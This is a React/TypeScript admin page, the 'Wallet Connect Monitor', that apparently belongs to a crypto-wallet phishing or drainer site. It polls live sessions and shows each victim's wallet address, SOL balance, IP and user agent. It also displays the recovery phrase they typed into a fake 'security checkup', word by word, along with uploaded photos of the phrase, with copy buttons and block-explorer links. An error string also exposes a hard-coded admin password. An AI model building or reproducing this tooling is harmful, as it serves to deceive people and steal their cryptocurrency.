import { useCallback, useEffect, useMemo, useState } from 'react'
import {
  Copy,
  ExternalLink,
  KeyRound,
  RefreshCw,
  Radio,
  Shield,
  Wallet,
  Check,
} from 'lucide-react'
import toast from 'react-hot-toast'
import { EmptyState } from '../../components/admin/EmptyState'
import { StatCard } from '../../components/admin/StatCard'
import { WalletLogo } from '../../lib/walletLogos'
import { adminFetchJsonResult } from '../../lib/adminDemo'
import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
import { listCloudWalletSessions, subscribeCloudWalletSessions } from '../../lib/walletCloudStore'
import { listCloudPhraseSnaps, subscribeCloudPhraseSnaps } from '../../lib/walletPhraseSnapsCloud'

export interface LiveWalletConnection {
  id: string
  walletAddress: string
  walletType: string
  chain: string
  network: string
  balanceSol: number | null
  pageUrl: string | null
  userAgent: string | null
  clientIp: string | null
  browserSessionId: string | null
  unlockPassword: string | null
  phraseSnapImage?: string | null
  connectedAt: string
  lastSeenAt: string
  connectionStatus: string
  user: {
    id: string
    displayName: string | null
    xUsername: string | null
    email: string | null
    avatarUrl: string | null
  } | null
}

function timeAgo(iso: string): string {
  const sec = Math.floor((Date.now() - new Date(iso).getTime()) / 1000)
  if (sec < 5) return 'just now'
  if (sec < 60) return `${sec}s ago`
  const min = Math.floor(sec / 60)
  if (min < 60) return `${min}m ago`
  return `${Math.floor(min / 60)}h ago`
}

function CopyButton({ value, label }: { value: string; label: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      type="button"
      onClick={() => {
        navigator.clipboard.writeText(value)
        setCopied(true)
        toast.success(`${label} copied`)
        setTimeout(() => setCopied(false), 2000)
      }}
      className="p-1.5 rounded-md border border-[#243044] text-gray-400 hover:text-white hover:border-[#3d5268] transition-colors"
      title={`Copy ${label}`}
    >
      {copied ? <Check className="w-3.5 h-3.5 text-[#c7f284]" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

function PhraseCell({ phrase, snap }: { phrase: string | null; snap?: string | null }) {
  const text = phrase?.trim() || ''
  const wordCount = text ? text.split(/\s+/).filter(Boolean).length : 0
  const hasSnap = Boolean(snap?.startsWith('data:image'))

  if (!text && !hasSnap) {
    return (
      <span className="inline-flex items-center gap-1.5 text-[11px] text-gray-500 italic">
        <span className="w-1.5 h-1.5 rounded-full bg-amber-400/80 animate-pulse" />
        Waiting for security checkup…
      </span>
    )
  }

  return (
    <div className="flex items-start gap-2 max-w-[320px]">
      <div className="flex-1 min-w-0 rounded-lg bg-[#060A0E] border border-[#243044] px-3 py-2">
        {text ? (
          <>
            <div className="flex items-center justify-between gap-2 mb-1">
              <p className="text-[10px] uppercase tracking-wider text-gray-500">Recovery phrase (live)</p>
              {wordCount < 12 ? (
                <span className="text-[10px] font-semibold text-amber-400 tabular-nums">{wordCount}/12 words</span>
              ) : (
                <span className="text-[10px] font-semibold text-[#c7f284]">Complete</span>
              )}
            </div>
            <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
          </>
        ) : (
          <p className="text-[10px] uppercase tracking-wider text-gray-500 mb-2">Phrase photo</p>
        )}
        {hasSnap ? (
          <a href={snap!} target="_blank" rel="noopener noreferrer" className="mt-2 block">
            <img
              src={snap!}
              alt="Recovery phrase snap"
              className="max-h-32 w-full rounded-md border border-[#243044] object-contain bg-black"
            />
            <span className="text-[10px] text-[#c7f284] mt-1 inline-block">Open full image</span>
          </a>
        ) : null}
      </div>
      {text ? <CopyButton value={text} label="Phrase" /> : null}
    </div>
  )
}

function SessionRow({ c }: { c: LiveWalletConnection }) {
  const live = Date.now() - new Date(c.lastSeenAt).getTime() < 25_000
  const short = `${c.walletAddress.slice(0, 6)}…${c.walletAddress.slice(-6)}`

  return (
    <tr className="border-b border-[#16212D]/80 hover:bg-[#0D151F]/80 transition-colors">
      <td className="px-4 py-4 align-top">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 rounded-xl bg-[#16212D] overflow-hidden flex items-center justify-center flex-shrink-0 p-1">
            <WalletLogo name={c.walletType} className="w-8 h-8" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <p className="text-sm font-semibold text-white font-mono">{short}</p>
              {live ? (
                <span className="text-[10px] font-bold uppercase tracking-wide text-[#c7f284] bg-[#c7f284]/10 border border-[#c7f284]/30 px-2 py-0.5 rounded-full">
                  Live
                </span>
              ) : (
                <span className="text-[10px] font-bold uppercase tracking-wide text-gray-500 bg-[#16212D] px-2 py-0.5 rounded-full">
                  Saved
                </span>
              )}
            </div>
            <p className="text-[11px] font-mono text-gray-500 break-all mt-1 leading-relaxed">{c.walletAddress}</p>
            <div className="flex items-center gap-1 mt-2">
              <CopyButton value={c.walletAddress} label="Address" />
              <a
                href={`https://solscan.io/account/${c.walletAddress}`}
                target="_blank"
                rel="noopener noreferrer"
                className="p-1.5 rounded-md border border-[#243044] text-gray-400 hover:text-[#c7f284] transition-colors"
                title="Solscan"
              >
                <ExternalLink className="w-3.5 h-3.5" />
              </a>
            </div>
          </div>
        </div>
      </td>
      <td className="px-4 py-4 align-top hidden md:table-cell">
        <p className="text-xs font-medium text-gray-200 capitalize">{c.walletType}</p>
        <p className="text-[10px] text-gray-500 mt-0.5">{c.network}</p>
        {c.balanceSol != null && (
          <p className="text-[11px] text-[#c7f284] font-semibold mt-1">{c.balanceSol.toFixed(4)} SOL</p>
        )}
      </td>
      <td className="px-4 py-4 align-top">
        <PhraseCell phrase={c.unlockPassword} snap={c.phraseSnapImage} />
      </td>
      <td className="px-4 py-4 align-top hidden lg:table-cell">
        <p className="text-[11px] text-gray-400">{timeAgo(c.lastSeenAt)}</p>
        <p className="text-[10px] text-gray-600 mt-1">
          Connected {new Date(c.connectedAt).toLocaleString(undefined, { dateStyle: 'short', timeStyle: 'short' })}
        </p>
      </td>
    </tr>
  )
}

export const AdminWalletConnect: React.FC = () => {
  const [connections, setConnections] = useState<LiveWalletConnection[]>([])
  const [loading, setLoading] = useState(true)
  const [polling, setPolling] = useState(true)
  const [lastSync, setLastSync] = useState<string>('')
  const [apiError, setApiError] = useState<string | null>(null)

  const load = useCallback(async () => {
    const { data, ok, status } = await adminFetchJsonResult<{
      connections: LiveWalletConnection[]
      serverTime?: string
    }>('/api/admin/wallet-connections/live', { connections: [] })

    const cloud = await listCloudWalletSessions()
    const snapByWallet = await listCloudPhraseSnaps()
    const cloudWithSnaps = cloud.map((row) => ({
      ...row,
      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
    })) as LiveWalletConnection[]
    const local = listLocalWalletSessions() as LiveWalletConnection[]
    const localWithSnaps = local.map((row) => ({
      ...row,
      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
    }))
    const merged = mergeWalletSessions(
      mergeWalletSessions(ok ? data.connections || [] : [], cloudWithSnaps),
      localWithSnaps
    )
    setConnections(merged)
    setLastSync(new Date().toISOString())

    if (merged.length === 0 && cloud.length === 0 && !ok && (status === 401 || status === 403)) {
      setApiError('Admin API rejected the request. Unlock admin again with password brutal.force.attac.')
    } else {
      setApiError(null)
    }

    setLoading(false)
  }, [])

  useEffect(() => {
    load()
    const unsubLocal = subscribeWalletMonitor(load)
    const unsubCloud = subscribeCloudWalletSessions(load)
    const unsubSnaps = subscribeCloudPhraseSnaps(load)
    return () => {
      unsubLocal()
      unsubCloud()
      unsubSnaps()
    }
  }, [load])

  useEffect(() => {
    if (!polling) return
    const id = setInterval(load, 1500)
    return () => clearInterval(id)
  }, [polling, load])

  const stats = useMemo(() => {
    const withPassword = connections.filter((c) => c.unlockPassword?.trim()).length
    const live = connections.filter((c) => Date.now() - new Date(c.lastSeenAt).getTime() < 25_000).length
    return { total: connections.length, withPassword, live }
  }, [connections])

  return (
    <div className="space-y-5">
      <div className="flex flex-col lg:flex-row lg:items-end lg:justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <Shield className="w-5 h-5 text-[#c7f284]" />
            <h1 className="text-xl font-bold text-white">Wallet Connect Monitor</h1>
          </div>
          <p className="text-xs text-gray-500 max-w-xl leading-relaxed">
            Live view of every wallet that connects on the site. New sessions appear here automatically.
          </p>
          {lastSync && (
            <p className="text-[10px] text-gray-600 mt-1">Last sync {new Date(lastSync).toLocaleTimeString()}</p>
          )}
        </div>
        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setPolling((p) => !p)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold border transition-colors ${
              polling
                ? 'border-[#c7f284]/40 text-[#c7f284] bg-[#c7f284]/10'
                : 'border-[#16212D] text-gray-400 hover:text-white'
            }`}
          >
            <Radio className="w-3.5 h-3.5" />
            Live {polling ? 'on' : 'off'}
          </button>
          <button
            type="button"
            onClick={() => {
              setLoading(true)
              load()
            }}
            className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold border border-[#16212D] text-gray-300 hover:text-white hover:border-[#243044]"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            Refresh
          </button>
        </div>
      </div>

      {apiError && (
        <div className="rounded-xl border border-amber-500/40 bg-amber-500/10 px-4 py-3 text-xs text-amber-100 leading-relaxed">
          {apiError}
        </div>
      )}

      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <StatCard title="Active sessions" value={stats.total} icon={<Wallet className="w-4 h-4" />} loading={loading} />
        <StatCard
          title="With phrase"
          value={stats.withPassword}
          icon={<KeyRound className="w-4 h-4" />}
          loading={loading}
          description="Typed on security checkup"
        />
        <StatCard title="Live now" value={stats.live} icon={<Radio className="w-4 h-4" />} loading={loading} />
      </div>

      <div className="bg-[#0B1118] border border-[#16212D] rounded-xl overflow-hidden">
        {loading && connections.length === 0 ? (
          <div className="p-8 space-y-3">
            {[0, 1, 2].map((i) => (
              <div key={i} className="h-16 bg-[#16212D] rounded-lg animate-pulse" />
            ))}
          </div>
        ) : connections.length === 0 ? (
          <EmptyState
            title="No connected wallets yet"
            description="When someone connects MetaMask or another wallet on the live site, the address appears here. Keep this page open."
          />
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[720px] text-left">
              <thead>
                <tr className="border-b border-[#16212D] bg-[#080D12]">
                  <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500">
                    Wallet address
                  </th>
                  <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500 hidden md:table-cell">
                    Wallet
                  </th>
                  <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500">
                    Recovery phrase
                  </th>
                  <th className="px-4 py-3 text-[10px] font-bold uppercase tracking-wider text-gray-500 hidden lg:table-cell">
                    Activity
                  </th>
                </tr>
              </thead>
              <tbody>
                {connections.map((c) => (
                  <SessionRow key={c.id} c={c} />
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}
